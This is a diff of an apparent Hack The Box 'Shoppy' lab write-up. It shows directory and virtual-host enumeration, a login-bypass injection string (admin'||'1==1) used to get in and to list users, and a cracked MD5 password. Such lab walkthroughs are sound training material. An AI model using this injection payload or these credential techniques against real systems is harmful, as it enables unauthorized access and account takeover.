@@ -90,28 +90,64 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 117.17 seconds
 ```
 
-Before we can access the page we need to add it to /etc/hosts. At the same time lets run a feroxbuster for more directories.
+Before we can access the page we need to add it to /etc/hosts. At the same time lets run a feroxbuster for more directories and a gobuster for more domain enumeration.
 
-
-http://shoppy.htb/login
-
+Feroxbuster gets back to us with a login page. These 2 links will help but do not have the direct answer.
 https://book.hacktricks.xyz/pentesting-web/login-bypass
 
 https://book.hacktricks.xyz/pentesting-web/nosql-injection
 
+```console
+└──╼ [★]$ feroxbuster -u http://shoppy.htb/ -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php.html,txt,git -q
+301       10l       16w      179c http://shoppy.htb/images
+301       10l       16w      171c http://shoppy.htb/js
+301       10l       16w      173c http://shoppy.htb/css
+200       26l       62w     1074c http://shoppy.htb/login
+302        1l        4w       28c http://shoppy.htb/admin
+301       10l       16w      179c http://shoppy.htb/assets
+301       10l       16w      187c http://shoppy.htb/assets/css
+301       10l       16w      185c http://shoppy.htb/assets/js
+301       10l       16w      187c http://shoppy.htb/assets/img
+301       10l       16w      177c http://shoppy.htb/fonts
+301       10l       16w      191c http://shoppy.htb/assets/fonts
+301       10l       16w      203c http://shoppy.htb/assets/img/avatars
+301       10l       16w      181c http://shoppy.htb/exports
+200       57l      129w     2178c http://shoppy.htb/
+```
+
+A friend was able to use this slqi to get in (Still need to ask how he came to the conclusion)
 
 
 Since one of the usernames is admin we can put that in front of our sqlinjection.
 
-admin'||'1==1
+After inputting this string ```admin'||'1==1``` we are in.
+
+![image](https://user-images.githubusercontent.com/105310322/192317020-b61ec9df-37b4-477e-93e2-6b14b288cfca.png)
+
+
+Now if we navigate to search for more users and input the same sqli it will populate the users on the system.
+
+
+![image](https://user-images.githubusercontent.com/105310322/192316925-2bf380d6-61d9-4aec-8ae0-4f8e7551d39d.png)
+
 
 6ebcea65320589ca4f2f1ce039975995	md5	remembermethisway
 
 josh credentials
 
-http://mattermost.shoppy.htb
+```console
 
-cat password-manager
+└──╼ [★]$ gobuster vhost -u http://shoppy.htb/ -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -q
+
+Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
+```
+
+![image](https://user-images.githubusercontent.com/105310322/192318703-c2ad5e68-8e51-46df-94c1-29b628552852.png)
+
+
+![image](https://user-images.githubusercontent.com/105310322/192319017-5dfd3369-63f1-48e4-ace0-10c184737abd.png)
+
+
 
 ```console
 jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
